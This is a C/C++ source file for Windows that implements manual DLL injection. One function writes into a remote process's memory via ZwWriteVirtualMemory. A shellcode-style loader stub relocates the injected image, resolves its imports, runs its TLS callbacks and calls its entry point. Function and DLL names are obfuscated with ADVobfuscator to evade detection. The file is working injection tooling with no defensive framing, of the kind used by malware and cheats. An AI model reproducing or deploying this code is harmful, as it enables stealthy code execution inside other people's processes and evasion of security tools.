
#include "main.h"

BOOL myWriteProcessMemory(HANDLE  hProcess,LPVOID  lpBaseAddress,LPCVOID lpBuffer, SIZE_T  nSize, SIZE_T  *lpNumberOfBytesWritten)
{
    using namespace andrivet::ADVobfuscator;
   // pZwProtectVirtualMemory ZwProtectVirtualMemory;
    pZwWriteVirtualMemory   ZwWriteVirtualMemory;
   // DWORD OldProtect,d2;
    NTSTATUS status=0;
   // ULONG roundup=4096*((nSize -1)/4096 + 1);

    typedef ULONG (WINAPI *pRtlNtStatusToDosError)(NTSTATUS Status);
    pRtlNtStatusToDosError RtlNtStatusToDosError=(pRtlNtStatusToDosError)GetProcAddress(GetModuleHandle(OBFUSCATED4("ntdll.dll")),OBFUSCATED4("RtlNtStatusToDosError"));

    typedef void (WINAPI *pSetLastError)(DWORD dwErrCode);
    pSetLastError SetLError=(pSetLastError)GetProcAddress(GetModuleHandle(OBFUSCATED4("kernel32.dll")),OBFUSCATED4("SetLastError"));


       // ZwProtectVirtualMemory=(pZwProtectVirtualMemory)GetModuleFunc(OBFUSCATED4("ntdll.dll"),OBFUSCATED4("ZwProtectVirtualMemory"));
        //qDebug("ZProtc: %p",ZwProtectVirtualMemory);
        ZwWriteVirtualMemory=(pZwWriteVirtualMemory)GetProcAddress(GetModuleHandle(OBFUSCATED4("ntdll.dll")),OBFUSCATED4("ZwWriteVirtualMemory"));


       // qDebug("ZWrt: %p",ZwWriteVirtualMemory);
        //status2=ZwProtectVirtualMemory(hProcess,lpBaseAddress,&roundup,PAGE_READWRITE, &OldProtect);
       // qDebug("S2: %x",status2);
        status=ZwWriteVirtualMemory(hProcess,lpBaseAddress,lpBuffer,nSize,lpNumberOfBytesWritten);
       // qDebug("S: %x - W:%x S:%x",status,lpNumberOfBytesWritten,nSize);
    //    qDebug("S3: %x",ZwProtectVirtualMemory(hProcess,&lpBaseAddress,&roundup,OldProtect,&d2));

      if (status)
        SetLError( RtlNtStatusToDosError(status) );
      return !status;
}


MYWORD WINAPI LoadDll2(PVOID p)
{
    typedef struct _MANUAL_INJECT
{
    PVOID ImageBase;
    PIMAGE_NT_HEADERS NtHeaders;
    PIMAGE_BASE_RELOCATION BaseRelocation;
    PIMAGE_IMPORT_DESCRIPTOR ImportDirectory;
    pLoadLibraryA fnLoadLibraryA;
    pGetProcAddress fnGetProcAddress;
}MANUAL_INJECT,*PMANUAL_INJECT;

typedef BOOL (WINAPI *PDLL_MAIN)(HMODULE,DWORD,PVOID);

    PMANUAL_INJECT ManualInject;

    HMODULE hModule;
    MYWORD i,Function,count,delta;

    PDWORD ptr;
    PWORD list;

    PIMAGE_BASE_RELOCATION pIBR;
    PIMAGE_IMPORT_DESCRIPTOR pIID;
    PIMAGE_IMPORT_BY_NAME pIBN;
    PIMAGE_THUNK_DATA FirstThunk,OrigFirstThunk;


    PDLL_MAIN EntryPoint;

    ManualInject=(PMANUAL_INJECT)p;

    pIBR=ManualInject->BaseRelocation;
    delta=(MYWORD)ManualInject->ImageBase - (MYWORD)ManualInject->NtHeaders->OptionalHeader.ImageBase;// Calculate the delta

    // Relocate the image

    while(pIBR->VirtualAddress)
    {
        if(pIBR->SizeOfBlock>=sizeof(IMAGE_BASE_RELOCATION))
        {
            count=(pIBR->SizeOfBlock-sizeof(IMAGE_BASE_RELOCATION))/sizeof(WORD);
            list=(PWORD)(pIBR+1);

            for(i=0;i<count;i++)
            {
                if(list[i])
                {
                    ptr=(PDWORD)((LPBYTE)ManualInject->ImageBase+(pIBR->VirtualAddress+(list[i] & 0xFFF)));
                    *ptr+=delta;
                }
            }
        }

        pIBR=(PIMAGE_BASE_RELOCATION)((LPBYTE)pIBR+pIBR->SizeOfBlock);
    }

    pIID=ManualInject->ImportDirectory;

    // Resolve DLL imports
    i=0;
    i--;
    while(pIID->Characteristics)
    {
        OrigFirstThunk=(PIMAGE_THUNK_DATA)((LPBYTE)ManualInject->ImageBase+pIID->OriginalFirstThunk);
        FirstThunk=(PIMAGE_THUNK_DATA)((LPBYTE)ManualInject->ImageBase+pIID->FirstThunk);

        hModule=ManualInject->fnLoadLibraryA((LPCSTR)ManualInject->ImageBase+pIID->Name);

        if(!hModule)
        {
            return 0;
        }

        while(OrigFirstThunk->u1.AddressOfData)
        {
            if(OrigFirstThunk->u1.Ordinal & IMAGE_ORDINAL_FLAG)
            {
                // Import by ordinal

                Function=(MYWORD)ManualInject->fnGetProcAddress(hModule,(LPCSTR)(OrigFirstThunk->u1.Ordinal & i)); // i era 0xffff antes!

                if(!Function)
                {
                    return 0;
                }

                FirstThunk->u1.Function=Function;
            }

            else
            {
                // Import by name

                pIBN=(PIMAGE_IMPORT_BY_NAME)((LPBYTE)ManualInject->ImageBase+OrigFirstThunk->u1.AddressOfData);
                Function=(MYWORD)ManualInject->fnGetProcAddress(hModule,(LPCSTR)pIBN->Name);

                if(!Function)
                {
                    return 0;
                }

                FirstThunk->u1.Function=Function;
            }

            OrigFirstThunk++;
            FirstThunk++;
        }

        pIID++;
    }

 // TLS :)
    if(ManualInject->NtHeaders->OptionalHeader.NumberOfRvaAndSizes>9)
    {
        PIMAGE_TLS_DIRECTORY tls;
        PIMAGE_TLS_CALLBACK* callback;
        tls = (PIMAGE_TLS_DIRECTORY) ((MYWORD)ManualInject->ImageBase + ManualInject->NtHeaders->OptionalHeader.DataDirectory[9].VirtualAddress);
        callback = (PIMAGE_TLS_CALLBACK *) tls->AddressOfCallBacks;
        if (callback)
         while (*callback)
           {
            (*callback)((LPVOID) ManualInject->ImageBase, DLL_PROCESS_ATTACH, NULL);
            callback++;
          }
    }
    //OptionalHeader.NumberOfRvaAndSizes
    if(ManualInject->NtHeaders->OptionalHeader.AddressOfEntryPoint)
    {
        EntryPoint=(PDLL_MAIN)((LPBYTE)ManualInject->ImageBase+ManualInject->NtHeaders->OptionalHeader.AddressOfEntryPoint);
        //asm volatile ("mov %esp,%ebp");
       return EntryPoint((HMODULE)ManualInject->ImageBase,DLL_PROCESS_ATTACH,NULL); // Call the entry point
       // return (DWORD) ManualInject->ImageBase;
    }

    return 0;
}

void WINAPI LoadDllEnd()
{
    return;
}
